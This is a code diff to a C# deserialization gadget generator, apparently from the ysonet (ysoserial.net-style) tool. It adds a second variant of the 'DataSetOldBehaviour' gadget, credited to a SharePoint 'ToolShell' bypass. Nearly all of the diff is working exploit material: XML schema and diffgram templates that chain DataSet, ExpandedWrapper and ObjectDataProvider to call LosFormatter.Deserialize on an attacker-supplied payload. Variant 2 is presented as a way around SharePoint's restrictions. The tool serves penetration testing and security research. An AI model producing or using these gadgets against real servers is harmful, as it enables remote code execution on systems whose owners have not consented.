@@ -13,6 +13,20 @@ namespace ysonet.Generators
 {
     internal class DataSetOldBehaviourGenerator : GenericGenerator
     {
+        private int variant_number = 1; // Add variant support
+        string spoofedAssembly = "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
+        
+        public override OptionSet Options()
+        {
+            OptionSet options = new OptionSet()
+            {
+                {"spoofedAssembly=", "The assembly name you want to use in the generated serialized object (example: 'mscorlib')", v => spoofedAssembly = v },
+                {"var|variant=", "Payload variant number where applicable. Choices: 1 (default), 2", v => int.TryParse(v, out this.variant_number) },
+            };
+
+            return options;
+        }
+
         public override string AdditionalInfo()
         {
             /*
@@ -22,8 +36,12 @@ namespace ysonet.Generators
                 2- Concept of converting BinaryFromatter to JSON by Soroush Dalili for further manipulation and pruning
                 
                 3- Markus Wulftange's idea of loading assembly byte code to bypass restrictions we currently have for ActivitySurrogateSelector
+
+                4- The variant 2 in the gadget comes from https://blog.viettelcybersecurity.com/sharepoint-toolshell/ where Khoa Dinh used an array to bypass the restrictions in SharePoint
                 
                 This gadget targets an old behavior of DataSet which uses XML format (https://github.com/microsoft/referencesource/blob/dae14279dd0672adead5de00ac8f117dcf74c184/System.Data/System/Data/DataSet.cs#L323) which is different than what was found in the DataSet gadget by James Forshaw
+                
+                
              */
             var info = @"This gadget targets an old behavior of DataSet which uses XML format";
 
@@ -37,7 +55,7 @@ namespace ysonet.Generators
 
         public override string Finders()
         {
-            return "Steven Seeley";
+            return "Steven Seeley, Markus Wulftange, Khoa Dinh";
         }
 
         public override string Contributors()
@@ -60,21 +78,6 @@ namespace ysonet.Generators
             return Formatters.LosFormatter;
         }
 
-        string spoofedAssembly = "System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
-        public override OptionSet Options()
-        {
-            OptionSet options = new OptionSet()
-            {
-                {"spoofedAssembly=", "The assembly name you want to use in the generated serialized object (example: 'mscorlib')", v => spoofedAssembly = v }
-            };
-
-            return options;
-        }
-
-        string xmlSchema = "<?xml version=\"1.0\" encoding=\"utf-16\"?>\r\n<xs:schema id=\"ds\" xmlns=\"\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\">\r\n  <xs:element name=\"ds\" msdata:IsDataSet=\"true\" msdata:UseCurrentLocale=\"true\">\r\n    <xs:complexType>\r\n      <xs:choice minOccurs=\"0\" maxOccurs=\"unbounded\">\r\n        <xs:element name=\"tbl\">\r\n          <xs:complexType>\r\n            <xs:sequence>\r\n <xs:element name=\"objwrapper\" msdata:DataType=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" type=\"xs:anyType\" msdata:targetNamespace=\"\" minOccurs=\"0\" />\r\n            </xs:sequence>\r\n          </xs:complexType>\r\n        </xs:element>\r\n      </xs:choice>\r\n    </xs:complexType>\r\n  </xs:element>\r\n</xs:schema>";
-
-        string xmlLosFormatterDeserializeCaller = "<diffgr:diffgram xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\" xmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\"><ds><tbl diffgr:id=\"tbl1\" msdata:rowOrder=\"0\"><objwrapper xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><ExpandedElement /><ProjectedProperty0><ObjectInstance xsi:type=\"LosFormatter\" /><MethodName>Deserialize</MethodName><MethodParameters><anyType xsi:type=\"xsd:string\">%LosFromatterPayload%</anyType></MethodParameters></ProjectedProperty0></objwrapper></tbl></ds></diffgr:diffgram>";
-
         public override object Generate(string formatter, InputArgs inputArgs)
         {
             byte[] losFormatterPayload;
@@ -85,6 +88,109 @@ namespace ysonet.Generators
             else
             {
                 losFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("LosFormatter", inputArgs);
+            }
+
+            // Define XML schemas and deserializer callers based on variant
+            string xmlSchema;
+            string xmlLosFormatterDeserializeCaller;
+
+            if (variant_number == 2)
+            {
+                // Variant 2: Alternative XML schema and deserializer caller
+                xmlSchema = @"<?xml version=""1.0"" encoding=""utf-16""?>
+<xs:schema xmlns="""" xmlns:xs=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">
+    <xs:element name=""ds"" msdata:IsDataSet=""true"" msdata:UseCurrentLocale=""true"">
+        <xs:complexType>
+            <xs:choice minOccurs=""0"" maxOccurs=""unbounded"">
+                <xs:element name=""tbl"">
+                    <xs:complexType>
+                        <xs:sequence>
+                            <xs:element name=""objwrapper"" msdata:DataType=""System.Collections.Generic.List`1[[System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"" type=""xs:anyType"" minOccurs=""0""/>
+                        </xs:sequence>
+                    </xs:complexType>
+                </xs:element>
+            </xs:choice>
+        </xs:complexType>
+    </xs:element>
+</xs:schema>
+";
+
+                xmlLosFormatterDeserializeCaller = @"<diffgr:diffgram xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"" xmlns:diffgr=""urn:schemas-microsoft-com:xml-diffgram-v1"">
+        <ds>
+            <tbl diffgr:id=""Table"" msdata:rowOrder=""0"" >
+                <objwrapper xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
+                    <ExpandedWrapperOfLosFormatterObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
+                        <ExpandedElement/>
+                        <ProjectedProperty0>
+                            <MethodName>Deserialize</MethodName>
+                            <MethodParameters>
+                                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">%LosFromatterPayload%</anyType>
+                            </MethodParameters>
+                            <ObjectInstance xsi:type=""LosFormatter""/>
+                        </ProjectedProperty0>
+                    </ExpandedWrapperOfLosFormatterObjectDataProvider>
+                </objwrapper>
+            </tbl>
+        </ds>
+    </diffgr:diffgram>
+";
+            }
+            else
+            {
+                // Variant 1: Default XML schema and deserializer caller
+                xmlSchema = @"<?xml version=""1.0"" encoding=""utf-16""?>
+<xs:schema
+    id=""ds""
+    xmlns=""""
+    xmlns:xs=""http://www.w3.org/2001/XMLSchema""
+    xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">
+  <xs:element name=""ds"" msdata:IsDataSet=""true"" msdata:UseCurrentLocale=""true"">
+    <xs:complexType>
+      <xs:choice minOccurs=""0"" maxOccurs=""unbounded"">
+        <xs:element name=""tbl"">
+          <xs:complexType>
+            <xs:sequence>
+              <xs:element
+                  name=""objwrapper""
+                  msdata:DataType=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""
+                  type=""xs:anyType""
+                  msdata:targetNamespace=""""
+                  minOccurs=""0"" />
+            </xs:sequence>
+          </xs:complexType>
+        </xs:element>
+      </xs:choice>
+    </xs:complexType>
+  </xs:element>
+</xs:schema>
+";
+
+                xmlLosFormatterDeserializeCaller = @"<diffgr:diffgram
+    xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata""
+    xmlns:diffgr=""urn:schemas-microsoft-com:xml-diffgram-v1"">
+
+  <ds>
+    <tbl diffgr:id=""tbl1"" msdata:rowOrder=""0"">
+      <objwrapper
+          xmlns:xsd=""http://www.w3.org/2001/XMLSchema""
+          xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"">
+
+        <ExpandedElement/>
+
+        <ProjectedProperty0>
+          <ObjectInstance xsi:type=""LosFormatter""/>
+          <MethodName>Deserialize</MethodName>
+          <MethodParameters>
+            <anyType xsi:type=""xsd:string"">%LosFromatterPayload%</anyType>
+          </MethodParameters>
+        </ProjectedProperty0>
+
+      </objwrapper>
+    </tbl>
+  </ds>
+
+</diffgr:diffgram>
+";
             }
 
             if (inputArgs.Minify)
